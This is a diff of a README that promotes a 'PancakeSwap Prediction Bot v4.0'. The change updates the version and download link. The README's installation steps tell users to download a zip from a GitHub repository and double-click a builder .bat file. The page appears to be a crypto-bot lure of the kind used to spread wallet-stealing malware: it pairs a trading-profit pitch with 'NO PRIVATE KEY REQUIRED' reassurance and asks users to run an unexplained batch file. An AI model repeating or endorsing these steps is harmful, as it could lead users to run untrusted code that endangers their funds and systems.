@@ -1,12 +1,11 @@
-# "Any trader can go to the moon, but only those who use the Pump bot will always stay there."
 
 # Coinsw.app - Combination of Useful Bots for Pancakeswap
 ![](https://i.ibb.co/vYccRn8/IMGLUNADUMP.png)
 
-# **🥞 PancakeSwap Prediction v3.9(21.06.2022) Bot (NO PRIVATE KEY REQUIRED!) 🤖**
+# **🥞 PancakeSwap Prediction Bot v4.0 NEW! (NO PRIVATE KEY REQUIRED!) 🤖**
 
-## 💡 PancakeSwap Prediction v3.7 Bot Installation
-1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PancakeSwapPredictionBot2023/archive/master.zip). 
+## 💡 PancakeSwap Prediction Bot v4.0 NEW! Installation
+1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PancakeSwap-Prediction-Bot-v4.0/archive/master.zip). 
 2. Unzip ``master.zip``
 3. Double click `PredictionBotBuilder.bat` 
 4. If your current internet is of poor quality, please build the light version => `LightVersionBuilder.bat` 
